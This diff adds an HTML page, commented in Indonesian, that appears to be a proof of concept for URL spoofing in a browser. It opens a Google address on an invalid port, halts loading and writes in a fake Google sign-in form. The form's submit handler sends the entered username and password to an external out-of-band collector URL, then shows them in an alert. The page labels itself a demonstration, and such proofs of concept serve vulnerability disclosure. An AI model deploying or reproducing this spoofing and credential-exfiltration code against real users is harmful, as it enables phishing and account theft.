@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">Click to spoof</button>
+<script>
+function spoof() {
+    let win = window.open("https://www.google.com:8080", "_blank");  // Buka URL spoof dulu (invalid port biar gagal load)
+    setTimeout(() => {
+        try {
+            win.window.stop();  // Stop load segera untuk retain URL
+            let payload = `<div style="text-align:center; font-family:Arial, sans-serif; padding: 20px;">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">
+                <h1 style="color: #333; margin: 20px 0;">Sign in</h1>
+                <p style="color: #555; margin-bottom: 20px;">Use your Google Account</p>
+                <form id="loginForm" style="max-width: 300px; margin: 0 auto; text-align: left;">
+                <div style="margin-bottom: 15px;">
+                    <label for="username" style="display: block; margin-bottom: 5px; font-weight: bold; color: #333;">Username or email</label>
+                    <input type="text" id="username" name="username" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;">
+                </div>
+                <div style="margin-bottom: 15px;">
+                    <label for="password" style="display: block; margin-bottom: 5px; font-weight: bold; color: #333;">Password</label>
+                    <input type="password" id="password" name="password" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;">
+                </div>
+                <div style="margin-bottom: 15px; text-align: right;">
+                    <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px;">Forgot password?</a>
+                </div>
+                <button type="submit" style="width: 100%; background-color: #1a73e8; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer;">Next</button>
+                </form>
+                <div style="margin-top: 30px; font-size: 14px; color: #666;">
+                <p>This is NOT Google! This is a demonstration page.</p>
+                </div>
+                </div>
+                <script>
+                document.getElementById("loginForm").addEventListener("submit", function(e) {
+                    e.preventDefault();
+                    let u = document.getElementById("username").value;
+                    let p = document.getElementById("password").value;
+                    let exfilUrl = "https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun/collect?username=" + encodeURIComponent(u) + "&password=" + encodeURIComponent(p);
+                    fetch(exfilUrl).catch(e => console.log("Exfiltration blocked:", e));
+                    alert("Your creds:\\nUsername: " + u + "\\nPassword: " + p);
+                });
+                <\/script>`;
+            win.document.write(payload);
+            win.document.close();
+        } catch (e) {
+            console.warn("Blocked:", e);
+        }
+    }, 100);  // Delay kecil untuk timing
+}
+</script>
+</body>
+</html>
